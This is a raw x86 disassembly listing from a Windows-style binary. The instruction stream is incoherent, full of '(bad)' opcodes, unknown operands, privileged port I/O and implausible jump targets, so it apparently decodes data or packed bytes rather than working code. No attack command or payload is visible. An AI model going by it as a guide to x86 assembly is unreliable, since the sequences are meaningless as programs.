  405c79:	mov    ds:0x2fcfe4da,eax
  405c7e:	pop    ebx
  405c7f:	out    0x38,al
  405c81:	push   0x15
  405c83:	push   ebp
  405c84:	push   edi
  405c85:	stos   BYTE PTR es:[edi],al
  405c86:	(bad)  
  405c87:	pop    ebx
  405c88:	outs   dx,WORD PTR ds:[esi]
  405c8a:	sub    al,0x38
  405c8c:	lods   al,BYTE PTR ss:[esi]
  405c8e:	inc    eax
  405c8f:	mov    edi,0x1934f2
  405c94:	sbb    eax,0x4b691e7b
  405c99:	outs   dx,DWORD PTR ds:[esi]
  405c9a:	xchg   ebx,eax
  405c9b:	mov    ebx,0x405452f7
  405ca0:	cs repz aad 0x55
  405ca4:	or     DWORD PTR [edi],ecx
  405ca6:	not    BYTE PTR [edx-0x6f]
  405ca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405caa:	data16 outs dx,BYTE PTR ds:[esi]
  405cac:	cli    
  405cad:	inc    esi
  405cae:	sbb    al,0xbe
  405cb0:	lahf   
  405cb1:	(bad)  [edi-0x6e]
  405cb4:	popf   
  405cb5:	js     0x405cad
  405cb7:	mov    bh,BYTE PTR [ebx]
  405cb9:	fldcw  WORD PTR [edi+ebx*2-0x15]
  405cbd:	add    BYTE PTR [ecx+0x29],0x36
  405cc1:	mov    ds:0x7665ef81,eax
  405cc6:	fisubr DWORD PTR [eax]
  405cc8:	sub    ebp,ecx
  405cca:	cmp    ebp,DWORD PTR [eax-0x37]
  405ccd:	mov    ds:0x512df8f3,al
  405cd2:	mov    ebx,esi
  405cd4:	pop    ds
  405cd5:	pop    edi
  405cd6:	dec    ebp
  405cd7:	jl     0x405ce6
  405cd9:	loopne 0x405c90
  405cdb:	shr    DWORD PTR [ebp-0x49],0x94
  405cdf:	mul    ch
  405ce1:	aaa    
  405ce2:	loop   0x405d5c
  405ce4:	cmovno ebp,DWORD PTR [ecx-0x6c]
  405ce8:	or     BYTE PTR [edx-0x4242d457],al
  405cee:	mov    edi,0xabc5193c
  405cf3:	sbb    ah,BYTE PTR [edx]
  405cf5:	xlat   BYTE PTR ds:[bx]
  405cf7:	nop
  405cf8:	aad    0xc6
  405cfa:	push   es
  405cfb:	pop    esi
  405cfc:	jno    0x405d31
  405cfe:	push   edx
  405cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d00:	in     eax,dx
  405d01:	adc    al,0x7b
  405d03:	int    0xa6
  405d05:	shr    DWORD PTR [eax+0x3613cc9c],1
  405d0b:	stos   BYTE PTR es:[edi],al
  405d0c:	xchg   edi,eax
  405d0d:	add    DWORD PTR [eax-0x2f86acf4],ebx
  405d13:	add    dh,BYTE PTR [edi+0x19769e3b]
  405d19:	das    
  405d1a:	mov    esi,0x7134c910
  405d1f:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  405d21:	aas    
  405d22:	and    al,BYTE PTR [eax-0x2ee635ab]
  405d28:	sti    
  405d29:	les    ecx,FWORD PTR [edx*8-0x359a618d]
  405d30:	jg     0x405d1d
  405d32:	sbb    al,dh
  405d34:	mov    ebp,0x7566333d
  405d39:	call   0x1828068e
  405d3e:	cmp    al,0xcd
  405d40:	test   DWORD PTR [ecx],eax
  405d42:	loop   0x405d45
  405d44:	mov    ?,ebx
  405d46:	inc    ecx
  405d47:	cmp    DWORD PTR [edi+0x6c1fd8d7],edi
  405d4d:	sub    al,0x64
  405d4f:	test   DWORD PTR [esi+0x5a144a],esp
  405d55:	xchg   esp,eax
  405d56:	mov    esp,DWORD PTR [edi]
  405d58:	test   DWORD PTR [eax+0x52c36471],ebp
  405d5e:	mov    dh,0xfb
  405d60:	fidiv  DWORD PTR [eax]
  405d62:	push   ebx
  405d63:	std    
  405d64:	repnz mov edx,0x538c6c54
  405d6a:	in     eax,dx
  405d6b:	and    BYTE PTR [edi],ch
  405d6d:	mov    ebp,0xf13ca11b
  405d72:	push   ds
  405d73:	fcomi  st,st(3)
  405d75:	xor    bh,BYTE PTR [edx+0x4e]
  405d78:	arpl   WORD PTR [ebx],cx
  405d7a:	fdivr  QWORD PTR [ebx]
  405d7c:	inc    edi
  405d7d:	jno    0x405da4
  405d7f:	fimul  WORD PTR [ebx+0x622b468e]
  405d85:	icebp  
  405d86:	pop    ss
  405d87:	gs cmp al,0xc4
  405d8a:	mov    ch,0x56
  405d8c:	adc    BYTE PTR [ecx],dh
  405d8e:	test   BYTE PTR [edi+0x6d034d0b],dh
  405d94:	lea    esp,[edx-0x3]
  405d97:	adc    bh,BYTE PTR [esi]
  405d99:	mov    dl,0xd1
  405d9b:	and    ebp,DWORD PTR [edi-0xb]
  405d9e:	sbb    DWORD PTR [edx+0x55a4a1cf],eax
  405da4:	and    BYTE PTR ds:0x66c5a08e,cl
  405daa:	add    DWORD PTR [ebx-0x68],esi
  405dad:	mov    esi,edx
  405daf:	pushf  
  405db0:	rcl    BYTE PTR [edi-0x2eb7764],cl
  405db6:	arpl   WORD PTR [ecx+0x33f8e278],sp
  405dbc:	xor    BYTE PTR [ecx-0x73562002],ah
  405dc2:	imul   ecx,DWORD PTR [ecx],0xffffffc9
  405dc5:	cmp    ecx,DWORD PTR [eax+ebp*4+0x38]
  405dc9:	out    0xf6,eax
  405dcb:	mov    esi,0x3c850e3b
  405dd0:	out    dx,al
  405dd1:	inc    esp
  405dd2:	mov    esp,0x3ebf2821
  405dd7:	stos   BYTE PTR es:[edi],al
  405dd8:	sub    DWORD PTR [edx],esi
  405dda:	sbb    ebx,DWORD PTR fs:[esi]
  405ddd:	shr    BYTE PTR [ecx-0x104218b9],cl
  405de3:	xchg   edi,eax
  405de4:	addr16 in al,0xf9
  405de7:	mov    dl,0xf4
  405de9:	and    al,0xbf
  405deb:	xchg   ecx,eax
  405dec:	test   DWORD PTR [esi+0x60a79502],ebx
  405df2:	and    DWORD PTR [ebx],edi
  405df4:	into   
  405df5:	cmp    ch,ah
  405df7:	test   ch,0xe0
  405dfa:	pushf  
  405dfb:	ret    0xea6b
  405dfe:	fadd   DWORD PTR [eax]
  405e00:	mov    DWORD PTR [eax-0x41],esp
  405e03:	add    BYTE PTR ds:[edi],ch
  405e06:	push   esi
  405e07:	call   0xe269cb61
  405e0c:	add    eax,0x56996232
  405e11:	inc    esi
  405e12:	jl     0x405e70
  405e14:	je     0x405e25
  405e16:	sahf   
  405e17:	jo     0x405e5d
  405e19:	inc    ecx
  405e1a:	fidiv  DWORD PTR [edi-0x61]
  405e1d:	cmp    dh,ch
  405e1f:	outs   dx,DWORD PTR ds:[esi]
  405e20:	adc    eax,0xc53a295e
  405e25:	mov    eax,ds:0x5dda1cb8
  405e2a:	pop    esi
  405e2b:	push   eax
  405e2c:	mov    ebx,0xe7b76d0f
  405e31:	loopne 0x405dff
  405e33:	pop    ebx
  405e34:	lds    ecx,FWORD PTR [ebx]
  405e36:	addr16 (bad) 
  405e39:	mul    DWORD PTR [ebp-0x6b]
  405e3c:	fistp  DWORD PTR [edi]
  405e3e:	mov    dl,0x61
  405e40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e41:	daa    
  405e42:	scas   eax,DWORD PTR es:[edi]
  405e43:	xchg   DWORD PTR [ebp-0x194f2080],ebx
  405e49:	ds (bad) 
  405e4b:	push   edx
  405e4c:	xchg   BYTE PTR [ebp+0x19],bh
  405e4f:	jle    0x405e6a
  405e51:	sub    cl,BYTE PTR [eax-0x631702a]
  405e57:	mov    bh,0xd0
  405e59:	push   ss
  405e5a:	push   ebx
  405e5b:	add    DWORD PTR [edx+0x4d],esp
  405e5e:	and    esp,DWORD PTR [ecx+0x79a64c6a]
  405e64:	pop    edi
  405e65:	jmp    0x405e61
  405e67:	add    al,0x5b
  405e69:	jnp    0x405e36
  405e6b:	je     0x405e25
  405e6d:	jbe    0x405e4d
  405e6f:	xor    al,0x49
  405e71:	ret    
  405e72:	aaa    
  405e73:	or     BYTE PTR [edx+0x54],ch
  405e76:	lock jmp 0x405eac
  405e79:	sbb    cl,BYTE PTR ds:0x4d0956d8
  405e7f:	mov    edi,0x8aed0752
  405e84:	loop   0x405e51
  405e86:	enter  0x7f1d,0x3c
  405e8a:	int    0xc8
  405e8c:	or     al,0xad
  405e8e:	leave  
  405e8f:	add    al,0x15
  405e91:	pop    eax
  405e92:	nop
  405e93:	dec    esp
  405e94:	pop    esi
  405e95:	cmp    DWORD PTR [ebp+ebp*2+0x6],ebp
  405e99:	xlat   BYTE PTR ds:[ebx]
  405e9a:	ret    
  405e9b:	xchg   esi,eax
  405e9c:	fwait
  405e9d:	je     0x405e5c
  405e9f:	and    al,0x51
  405ea1:	les    edi,FWORD PTR [edx+0x32918f2d]
  405ea7:	mov    dl,0x57
  405ea9:	mov    ah,0x85
  405eab:	adc    esp,DWORD PTR [edi]
  405ead:	push   eax
  405eae:	jns    0x405e51
  405eb0:	add    eax,0xf9914d1a
  405eb5:	sbb    bl,BYTE PTR [ecx]
  405eb7:	sti    
  405eb8:	mov    al,0x81
  405eba:	jnp    0x405ea0
  405ebc:	retf   
  405ebd:	mov    ds:0xebfa5c21,eax
  405ec2:	pop    ds
  405ec3:	pop    edx
  405ec4:	xor    ah,ch
  405ec6:	into   
  405ec7:	adc    DWORD PTR [eax-0x62ac06b3],edx
  405ecd:	sar    ecx,0xd4
  405ed0:	add    ebx,DWORD PTR [esi+ecx*8-0x6d]
  405ed4:	je     0x405eaa
  405ed6:	ins    DWORD PTR es:[edi],dx
  405ed7:	cwde   
  405ed8:	inc    edx
  405ed9:	adc    eax,0x6d589396
  405ede:	fild   WORD PTR [ebx]
  405ee0:	lock push ds
  405ee2:	mov    ds:0xd8c43708,eax
  405ee7:	cmp    ebx,DWORD PTR ds:0xbf8b9752
  405eed:	popf   
  405eee:	cmp    DWORD PTR [ebx+0xc],edi
  405ef1:	in     al,0x4f
  405ef3:	dec    ecx
  405ef4:	mov    DWORD PTR [edx-0x4a62d6ab],esi
  405efa:	mov    WORD PTR [esi-0x38],?
  405efd:	cmp    BYTE PTR ds:[ebx+0x667a5a1f],ah
  405f04:	jnp    0x405f3c
  405f06:	out    dx,eax
  405f07:	sub    al,0xd0
  405f09:	(bad)  
  405f0a:	xor    edx,esi
  405f0c:	(bad)  
  405f0d:	xor    ebx,DWORD PTR [ebx-0x46bb6a13]
  405f13:	test   BYTE PTR [esi],ah
  405f15:	sbb    ch,BYTE PTR [eax-0x4b]
  405f18:	fsub   QWORD PTR [ebp+0x7b355ff9]
  405f1e:	mov    ch,0x8
  405f20:	push   edi
  405f21:	das    
  405f22:	add    dl,BYTE PTR [esi-0x647c60a4]
  405f28:	and    BYTE PTR [ecx+0x14],cl
  405f2b:	repnz inc esi
  405f2d:	(bad)  
  405f2e:	cmp    al,0xe7
  405f30:	stos   DWORD PTR es:[edi],eax
  405f31:	adc    dh,BYTE PTR fs:0xf351a458
  405f38:	jb     0x405ee2
  405f3a:	add    ebp,ebp
  405f3c:	cs sub al,0x29
  405f3f:	js     0x405f9e
  405f41:	test   eax,0x86240980
  405f46:	aad    0x44
  405f48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f49:	loope  0x405fa0
  405f4b:	enter  0x689f,0xf1
  405f4f:	sbb    eax,0xcbae4a86
  405f54:	xor    eax,0x2d81d8de
  405f59:	mov    BYTE PTR [eax-0x45],0x8c
  405f5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f5e:	(bad)  
  405f5f:	in     eax,0x3a
  405f61:	jge    0x405fc4
  405f63:	jle    0x405fa7
  405f65:	pop    ecx
  405f66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f67:	mov    ecx,0x361c3190
  405f6c:	sub    al,0xf3
  405f6e:	or     ecx,0xc9f8c3c7
  405f74:	jmp    0x405f03
  405f76:	retf   0x7ec
  405f79:	cli    
  405f7a:	enter  0xe048,0x23
  405f7e:	dec    edx
  405f7f:	in     al,0x78
  405f81:	inc    esi
  405f82:	or     eax,DWORD PTR [ebx+edx*2+0x5524a803]
  405f89:	sbb    bh,0x7e
  405f8c:	popa   
  405f8d:	fwait
  405f8e:	pop    edi
  405f8f:	mov    eax,0x76547481
  405f94:	adc    BYTE PTR [eax-0x2f],dl
  405f97:	div    dl
  405f99:	ins    DWORD PTR es:[edi],dx
  405f9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f9b:	lods   al,BYTE PTR ds:[esi]
  405f9c:	mov    dl,0xfa
  405f9e:	jmp    0x405fe2
  405fa0:	in     eax,dx
  405fa1:	inc    esp
  405fa2:	lds    ebp,FWORD PTR [edx+0x46fdec0a]
  405fa8:	sbb    BYTE PTR ds:0xffa9746c,dh
  405fae:	cmc    
  405faf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fb0:	sub    ch,BYTE PTR [eax-0x1]
  405fb3:	lea    edx,[eax+0x3a]
  405fb6:	adc    BYTE PTR [ebx],al
  405fb8:	mov    ch,0x23
  405fba:	sub    BYTE PTR [esi],dl
  405fbc:	mov    edx,DWORD PTR [edi]
  405fbe:	add    DWORD PTR [ecx+0x12ae5591],edi
  405fc4:	adc    esp,ecx
  405fc6:	mov    DWORD PTR [ebx+ecx*8],edi
  405fc9:	repnz inc edx
  405fcb:	test   DWORD PTR [edi],ebp
  405fcd:	or     al,0xd6
  405fcf:	cmp    cl,bl
  405fd1:	push   ecx
  405fd2:	pop    esp
  405fd3:	out    dx,eax
  405fd4:	les    eax,FWORD PTR [eax+0x5b]
  405fd7:	cmp    edx,0xb102a40a
  405fdd:	mov    bl,0x4
  405fdf:	push   edi
  405fe0:	cmp    DWORD PTR ss:[eax+esi*1-0x3f9ed6c1],0x2e
  405fe9:	cwde   
  405fea:	pop    ss
  405feb:	jmp    0x406050
  405fed:	push   es
  405fee:	push   ebp
  405fef:	push   cs
  405ff0:	jmp    0xe5758694
  405ff5:	stos   DWORD PTR es:[edi],eax
  405ff6:	jbe    0x40600d
  405ff8:	out    dx,al
  405ff9:	in     eax,dx
  405ffa:	cdq    
  405ffb:	and    eax,0xbbbd78cf
  406000:	ins    BYTE PTR es:[edi],dx
  406001:	mov    ds:0xdca2dec3,eax
  406006:	and    cl,0x75
  406009:	mov    BYTE PTR [esi-0x80],bl
  40600c:	pop    edi
  40600d:	in     al,0x24
  40600f:	daa    
  406010:	sub    ecx,DWORD PTR [ecx]
  406012:	ret    
  406013:	pusha  
  406014:	lock jo 0x40608b
  406017:	mov    edi,0x41a996bc
  40601d:	lods   al,BYTE PTR ds:[esi]
  40601e:	inc    esi
  40601f:	dec    ebx
  406020:	gs ins BYTE PTR es:[edi],dx
  406022:	jp     0x405fb7
  406024:	mov    bh,0x3a
  406026:	adc    al,0x44
  406028:	and    bh,cl
  40602a:	dec    esp
  40602b:	mov    ebx,ebx
  40602d:	jns    0x40605a
  40602f:	shr    ah,0xb9
  406032:	lds    edx,FWORD PTR [ecx+0x61a9f861]
  406038:	lds    ebx,FWORD PTR [ebp+0x64ad0283]
  40603e:	mov    al,ds:0x573f6bd9
  406043:	popf   
  406044:	retf   
  406045:	push   ecx
  406046:	adc    eax,ecx
  406048:	adc    edi,DWORD PTR [ebx-0x2a66daa7]
  40604e:	mov    bl,0xfe
  406050:	scas   eax,DWORD PTR es:[edi]
  406051:	mov    BYTE PTR [edi-0x38],dh
  406054:	jbe    0x4060be
  406056:	or     esp,ebx
  406058:	fincstp 
  40605a:	test   al,0xbc
  40605c:	inc    esp
  40605d:	xchg   edx,eax
  40605e:	cdq    
  40605f:	imul   edi,DWORD PTR [edi],0xffffffaa
  406062:	xchg   BYTE PTR [edx+eiz*8],dl
  406065:	loopne 0x4060de
  406067:	adc    esi,ebp
  406069:	daa    
  40606a:	mov    cl,0xb3
  40606c:	xchg   BYTE PTR [ecx+edi*4+0x7b],ch
  406070:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406072:	mov    eax,0xdae1adcd
  406077:	jb     0x4060d5
  406079:	pop    edx
  40607a:	jb     0x406022
  40607c:	xchg   DWORD PTR fs:[ecx+0x44],eax
  406080:	push   0xae105f6d
  406085:	inc    ecx
  406086:	test   BYTE PTR [ebx],0xcc
  406089:	cmp    al,0x5f
  40608b:	test   BYTE PTR [eax-0x10],ch
  40608e:	dec    edx
  40608f:	addr16 rcr ah,cl
  406092:	pop    edi
  406093:	aaa    
  406094:	add    ch,BYTE PTR [edi-0xe]
  406097:	mov    DWORD PTR [eax],0x28264a4d
  40609d:	mov    esi,0xbf97aa90
  4060a2:	push   esi
  4060a3:	sbb    BYTE PTR [eax],0x71
  4060a6:	outs   dx,BYTE PTR ds:[esi]
  4060a7:	mov    ebx,0x7a292f29
  4060ac:	dec    esp
  4060ad:	and    al,0xd4
  4060af:	out    0xe,eax
  4060b1:	loope  0x4060a9
  4060b3:	push   esp
  4060b4:	dec    esp
  4060b5:	xchg   edi,eax
  4060b6:	dec    esi
  4060b7:	mov    WORD PTR [ecx+0x5bee3c03],es
  4060bd:	add    al,0x48
  4060bf:	push   0xffffff98
  4060c1:	mov    bh,0x55
  4060c3:	jle    0x406050
  4060c5:	in     al,dx
  4060c6:	and    eax,0x87fb03
  4060cb:	daa    
  4060cc:	or     eax,0xdedc08d7
  4060d1:	mov    fs,WORD PTR [esi-0x39]
  4060d4:	(bad)  
  4060d5:	idiv   BYTE PTR [ecx-0x6a]
  4060d8:	lea    esp,[edx]
  4060da:	stos   BYTE PTR es:[edi],al
  4060db:	les    ecx,FWORD PTR [ebx+ebp*8+0x30]
  4060df:	cmp    BYTE PTR [ebx],0x87
  4060e2:	fdiv   QWORD PTR [ecx]
  4060e4:	or     dh,dl
  4060e6:	jno    0x4060cd
  4060e8:	cld    
  4060e9:	outs   dx,DWORD PTR ds:[esi]
  4060ea:	ss push 0xcbae74f9
  4060f0:	dec    edi
  4060f1:	fwait
  4060f2:	ja     0x4060c5
  4060f4:	loope  0x40607d
  4060f6:	lock repnz test edx,0xfb9028bf
  4060fe:	mov    ebx,0xacd382f
  406103:	stc    
  406104:	pop    ss
  406105:	xor    edi,DWORD PTR [ebp-0x4c]
  406108:	scas   eax,DWORD PTR es:[edi]
  406109:	jbe    0x4060a8
  40610b:	int3   
  40610c:	loop   0x406100
  40610e:	icebp  
  40610f:	loopne 0x4060b3
  406111:	pop    ds
  406112:	test   bh,bh
  406114:	adc    DWORD PTR [ebx-0x7684de7d],esi
  40611a:	pop    ebp
  40611b:	sub    DWORD PTR [ebp-0x2],0x4d7a531f
  406122:	mov    ebx,0x6cc90a5b
  406127:	fldz   
  406129:	xchg   BYTE PTR [esp+ebp*8],al
  40612c:	(bad)
  406130:	xlat   BYTE PTR ds:[ebx]
  406131:	push   esp
  406132:	icebp  
  406133:	push   0xaf77d349
  406138:	lods   eax,DWORD PTR ds:[esi]
  406139:	inc    esp
  40613a:	sar    esp,1
  40613c:	inc    esi
  40613d:	jecxz  0x40615e
  40613f:	fcom   DWORD PTR [edx+esi*4]
  406142:	imul   edi,esp,0x8cee64d3
  406148:	cmp    DWORD PTR [eax+eiz*1],ebp
  40614b:	pop    ecx
  40614c:	push   ebp
  40614d:	jge    0x406186
  40614f:	cs inc ebx
  406151:	mov    edi,0xc048f17b
  406156:	loope  0x40616f
  406158:	or     ebp,edx
  40615a:	mov    edx,0xed451c44
  40615f:	fsub   DWORD PTR [ebx-0x1231ad5a]
  406165:	repz push edx
  406167:	fsub   DWORD PTR [ecx+0x7b5bdab3]
  40616d:	adc    eax,0xf9010a53
  406172:	test   eax,0x1f7fdbb9
  406177:	push   ebp
  406178:	imul   ebx,esp,0xffffff8c
  40617b:	and    BYTE PTR [eax],dh
  40617d:	pop    edi
  40617e:	mov    ?,WORD PTR [eax-0x46]
  406181:	or     dl,ch
  406183:	jl     0x40615c
  406185:	fimul  WORD PTR [edx+0x4c]
  406188:	loopne 0x406177
  40618a:	repnz pop ecx
  40618c:	and    DWORD PTR ds:0x50669d1b,esp
  406192:	adc    DWORD PTR [edi+0x6506817f],ebp
  406198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406199:	aaa    
  40619a:	or     BYTE PTR [ebp+0x1b09699b],cl
  4061a0:	stos   BYTE PTR es:[edi],al
  4061a1:	in     al,0xfd
  4061a3:	cmp    al,0x3
  4061a5:	or     ch,al
  4061a7:	mov    dl,0xeb
  4061a9:	xor    bl,ah
  4061ab:	cmp    eax,0x38347140
  4061b0:	cs cld 
  4061b2:	mov    eax,ds:0x56269bf1
  4061b7:	clc    
  4061b8:	fmul   DWORD PTR [ebp+esi*2+0x73675530]
  4061bf:	or     cl,BYTE PTR [ecx-0x5e]
  4061c2:	pop    edx
  4061c3:	sti    
  4061c4:	mul    eax
  4061c6:	sti    
  4061c7:	sbb    eax,0x2d7f745c
  4061cc:	loopne 0x406188
  4061ce:	jmp    0x2653:0xe6835d59
  4061d5:	push   edi
  4061d6:	hlt    
  4061d7:	nop
  4061d8:	clc    
  4061d9:	cmp    al,0x24
  4061db:	push   eax
  4061dc:	es xchg edx,eax
  4061de:	dec    esi
  4061df:	fwait
  4061e0:	inc    ecx
  4061e1:	or     eax,0x89737a76
  4061e6:	imul   ebp,edx,0x18
  4061e9:	mov    ebx,0x5740f41a
  4061ee:	(bad)  [edx-0x5c]
  4061f1:	mov    ss,WORD PTR [ebx]
  4061f3:	cmp    bl,BYTE PTR [esi-0x10]
  4061f6:	test   DWORD PTR [ebx],esi
  4061f8:	mov    DWORD PTR [eax+0x4f],ebx
  4061fb:	dec    eax
  4061fc:	fstp   st(0)
  4061fe:	icebp  
  4061ff:	hlt    
  406200:	lods   al,BYTE PTR ds:[esi]
  406201:	dec    eax
  406202:	push   ds
  406203:	sub    ebp,DWORD PTR [edx]
  406205:	inc    ebx
  406206:	mov    ecx,0x7f5b0fa5
  40620b:	(bad)  
  40620c:	(bad)  
  40620d:	scas   al,BYTE PTR es:[edi]
  40620e:	push   esp
  40620f:	out    0x8c,al
  406211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406212:	mov    dl,BYTE PTR [ebx-0xa]
  406215:	(bad)  
  406216:	cmc    
  406217:	xor    esp,edx
  406219:	add    al,0xe4
  40621b:	pop    ebp
  40621c:	xchg   DWORD PTR [eax+0x18911b3d],ecx
  406222:	das    
  406223:	pop    ebx
  406224:	jmp    0xb051:0x1a3e53b1
  40622b:	xchg   ecx,eax
  40622c:	in     al,0x7b
  40622e:	sub    esi,ecx
  406230:	xor    ah,dl
  406232:	stos   BYTE PTR es:[edi],al
  406233:	mov    dl,0xde
  406235:	(bad)  
  406236:	push   esp
  406237:	jp     0x4062af
  406239:	jo     0x4061e9
  40623b:	push   esi
  40623c:	jbe    0x4061d1
  40623e:	push   edx
  40623f:	sub    DWORD PTR [edi+ebp*4+0x28278a79],eax
  406246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406247:	loope  0x40628f
  406249:	push   edx
  40624a:	pop    esi
  40624b:	fsubp  st(5),st
  40624d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40624e:	mov    esp,0x94bd79f1
  406253:	pop    ebp
  406254:	cld    
  406255:	lds    ebx,FWORD PTR [edi+ebp*8+0x76]
  406259:	add    BYTE PTR [edi],cl
  40625b:	stos   DWORD PTR es:[edi],eax
  40625c:	xchg   edi,eax
  40625d:	div    DWORD PTR [edi+0x6b8cffd8]
  406263:	(bad)  
  406264:	xchg   ebx,eax
  406265:	fist   DWORD PTR [ebx+0x10000ae9]
  40626b:	xchg   BYTE PTR [ebx],dl
  40626d:	loopne 0x40622f
  40626f:	(bad)  
  406270:	xchg   edx,eax
  406271:	jb     0x40628b
  406273:	in     al,dx
  406274:	cmp    ch,BYTE PTR [ebp+esi*4+0x78]
  406278:	lea    edx,[ecx]
  40627a:	bound  eax,QWORD PTR [eax+0x23d9253c]
  406280:	stos   BYTE PTR es:[edi],al
  406281:	adc    dh,dl
  406283:	(bad)  
  406284:	fdivr  st,st(5)
  406286:	in     eax,0xc1
  406288:	mov    dh,0x18
  40628a:	sbb    eax,0x183efc85
  40628f:	js     0x40626d
  406291:	jg     0x406299
  406293:	sti    
  406294:	pop    eax
  406295:	sub    BYTE PTR [ecx-0x33],al
  406298:	xchg   ebp,eax
  406299:	inc    esi
  40629a:	sbb    ecx,DWORD PTR [ebp+0x51]
  40629d:	xor    ebx,DWORD PTR [ebp+0x1fcd05ee]
  4062a3:	push   edx
  4062a4:	sub    al,0xf5
  4062a6:	add    ah,al
  4062a8:	popf   
  4062a9:	iret   
  4062aa:	adc    al,0xa2
  4062ac:	in     eax,dx
  4062ad:	push   ebx
  4062ae:	mov    al,0xfa
  4062b0:	cmp    WORD PTR [ecx-0x3aed7b57],bp
  4062b7:	in     eax,0x0
  4062b9:	dec    edi
  4062ba:	mov    edx,0xf471e4cb
  4062bf:	xor    BYTE PTR [edx],ah
  4062c1:	iret   
  4062c2:	xchg   esi,eax
  4062c3:	push   0x7c
  4062c5:	or     DWORD PTR [ecx+0x1f2775ba],0x38
  4062cc:	outs   dx,DWORD PTR ds:[esi]
  4062cd:	or     ah,BYTE PTR [ecx-0x164cbff8]
  4062d3:	pop    ebp
  4062d4:	out    dx,eax
  4062d5:	adc    al,0xdf
  4062d7:	push   0xe71c6834
  4062dc:	mov    ebx,0xd7419fef
  4062e1:	outs   dx,BYTE PTR ds:[esi]
  4062e2:	add    DWORD PTR [eax],0x50a1156d
  4062e8:	and    ebp,DWORD PTR cs:[edx]
  4062eb:	and    cl,BYTE PTR [edi+0x44]
  4062ee:	and    eax,0x4a8afb37
  4062f3:	lea    esi,cs:[ebx]
  4062f6:	add    al,0x4d
  4062f8:	sti    
  4062f9:	cld    
  4062fa:	ficomp WORD PTR [ecx-0x5b]
  4062fd:	mov    ebp,0x5a0d140d
  406302:	pop    ebx
  406303:	ss addr16 test eax,0x8a785224
  40630a:	xor    edx,DWORD PTR ds:0x25652e1f
  406310:	shl    BYTE PTR [ebx+0x3a],0x5
  406314:	inc    ebx
  406315:	test   eax,0x22fc099
  40631a:	lahf   
  40631b:	inc    edi
  40631c:	dec    ebx
  40631d:	sbb    DWORD PTR [edi+ebp*2-0xdd0ef3e],ebx
  406324:	or     ecx,0x5d4924a
  40632a:	call   0xfe4a:0x16fc8204
  406331:	adc    ch,ah
  406333:	outs   dx,BYTE PTR ds:[esi]
  406334:	lods   al,BYTE PTR ds:[esi]
  406335:	icebp  
  406336:	jns    0x4063a6
  406338:	cmp    ecx,DWORD PTR [ecx]
  40633a:	cwde   
  40633b:	cs sti 
  40633d:	xchg   edi,eax
  40633e:	fsubr  DWORD PTR [edi]
  406340:	mov    edi,0x8d12b55e
  406345:	aaa    
  406346:	(bad)  
  406347:	loop   0x40639c
  406349:	sbb    eax,0x9bb4abf5
  40634e:	mov    eax,ds:0xab3b216b
  406353:	or     DWORD PTR [ebx+eax*2],edx
  406356:	cmp    edx,esi
  406358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406359:	jl     0x406386
  40635b:	sub    ah,cl
  40635d:	iret   
  40635e:	pop    esi
  40635f:	dec    esi
  406360:	loop   0x40636a
  406362:	jbe    0x406314
  406364:	in     al,0xa3
  406366:	dec    edi
  406367:	test   esp,esi
  406369:	mov    edx,esp
  40636b:	in     eax,dx
  40636c:	push   ebp
  40636d:	mov    BYTE PTR [ebp+eiz*1+0x37],dl
  406371:	pop    ebx
  406372:	imul   esp,DWORD PTR [edi-0x4638e65b],0xaec43c42
  40637c:	inc    ecx
  40637d:	jmp    0x4063a0
  40637f:	inc    ebp
  406380:	xor    ebx,esi
  406382:	mov    bh,0x92
  406384:	mov    esp,ebx
  406386:	dec    esp
  406387:	shr    dh,1
  406389:	retf   
  40638a:	sbb    ah,dh
  40638c:	xchg   edx,eax
  40638d:	test   dl,cl
  40638f:	jnp    0x4063cd
  406391:	and    DWORD PTR [ebx-0x6d],esp
  406394:	pop    eax
  406395:	inc    ebp
  406396:	pusha  
  406397:	pop    ebp
  406398:	adc    BYTE PTR [edx+edi*1-0x1f980ad7],cl
  40639f:	push   0xffffffba
  4063a1:	dec    ebx
  4063a2:	ss out dx,eax
  4063a4:	inc    esi
  4063a5:	or     BYTE PTR [eax+0x2b00e2d9],al
  4063ab:	xchg   edx,eax
  4063ac:	inc    ecx
  4063ad:	mov    esi,0x98b8bbd9
  4063b2:	mov    edx,0x6d65acc5
  4063b7:	je     0x4063fc
  4063b9:	das    
  4063ba:	fadd   st,st(5)
  4063bc:	and    al,0x97
  4063be:	fst    QWORD PTR [ecx-0x1e18195b]
  4063c4:	push   eax
  4063c5:	or     DWORD PTR [ecx-0x697e8044],eax
  4063cb:	jmp    0x8482:0xeaeda61b
  4063d2:	or     edi,DWORD PTR [ecx-0x4a]
  4063d5:	fadd   QWORD PTR [ebx]
  4063d7:	ret    0x54af
  4063da:	cmp    eax,0x696b35e5
  4063df:	int    0x44
  4063e1:	pop    edi
  4063e2:	sti    
  4063e3:	add    ecx,edx
  4063e5:	xor    ebp,ebp
  4063e7:	out    dx,al
  4063e8:	stc    
  4063e9:	sbb    esp,DWORD PTR [ebx-0x528adc38]
  4063ef:	xchg   edx,eax
  4063f0:	clc    
  4063f1:	sbb    dh,0x3b
  4063f4:	sub    ah,dl
  4063f6:	sbb    bl,0x55
  4063f9:	xchg   ecx,eax
  4063fa:	cmp    BYTE PTR [edx-0x6a],al
  4063fd:	arpl   WORD PTR [ecx],cx
  4063ff:	pop    ebp
  406400:	dec    eax
  406401:	or     eax,0x234a6aae
  406406:	popa   
  406407:	mov    dh,0x93
  406409:	lods   al,BYTE PTR ds:[esi]
  40640a:	xchg   DWORD PTR [esi-0x612b8b6e],edi
  406410:	out    0x20,al
  406412:	ficomp DWORD PTR [ebx+0x5224ad7e]
